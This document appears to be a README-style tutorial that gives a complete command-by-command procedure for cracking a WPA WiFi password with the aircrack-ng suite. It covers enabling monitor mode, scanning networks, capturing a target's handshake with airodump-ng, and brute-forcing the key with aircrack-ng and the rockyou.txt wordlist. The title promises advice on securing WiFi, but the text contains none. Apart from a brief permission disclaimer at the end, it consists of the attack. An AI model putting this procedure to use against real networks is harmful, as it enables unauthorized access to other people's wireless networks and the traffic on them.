
# 🔐 Crack WiFi Password || How to Secure Your WiFi

## 🛠 Prerequisites
- A WiFi adapter that supports **monitor mode** (or an internal adapter if supported).
- Linux-based system.

## 🚀 Steps to Crack WiFi Password

### 1️⃣ Setting Up the Environment

1. Switch to the root user:
   ```bash
   sudo su
   ```

2. Kill processes interfering with monitor mode:
   ```bash
   airmon-ng check kill  
   ```
   *This will display process IDs (PIDs).*

3. Identify your WiFi adapter and mode:
   ```bash
   iwconfig
   ```
   *You’ll see the adapter name (e.g., `wlan0`) and its mode (default is Managed).*

4. Enable monitor mode:
   ```bash
   iwconfig wlan0 mode monitor
   ```
   *The mode will now change to Monitor.*

---

### 2️⃣ Scanning for WiFi Networks

5. Use **airodump-ng** to view available networks:
   ```bash
   airodump-ng wlan0
   ```
   *If no networks appear, you might need a different adapter that supports monitor mode.*

---

### 3️⃣ Capturing the WPA Handshake

6. Target a network for attack:
   - Replace `-c` with the channel number.
   - Replace `--bssid` with the target’s BSSID.
   ```bash
   airodump-ng -c (Channel) --bssid (BSSID) -w psk wlan0
   ```
   *Wait until you capture the WPA handshake.*

7. Verify the capture:
   ```bash
   ls
   ```
   *Look for the captured file in `.cap` format.*

---

### 4️⃣ Cracking the Password

8. Locate the Linux wordlist file (`rockyou.txt`):
   ```bash
   locate rockyou.txt
   ```

9. Run Aircrack-ng to crack the password:
   ```bash
   aircrack-ng -w (Wordlist Path) -b (BSSID) psk-01.cap
   ```
   *The password will be displayed upon success.*

---

### 5️⃣ Restoring Managed Mode

10. Disable monitor mode and reconnect to WiFi:
    ```bash
    sudo ifconfig wlan0 down
    iwconfig wlan0 mode managed
    sudo ifconfig wlan0 up
    service NetworkManager restart
    ```

---

## 🚨 Important Notes
- Use these techniques **only** on networks you own or have explicit permission to test.
- Misuse for illegal purposes is strictly prohibited.
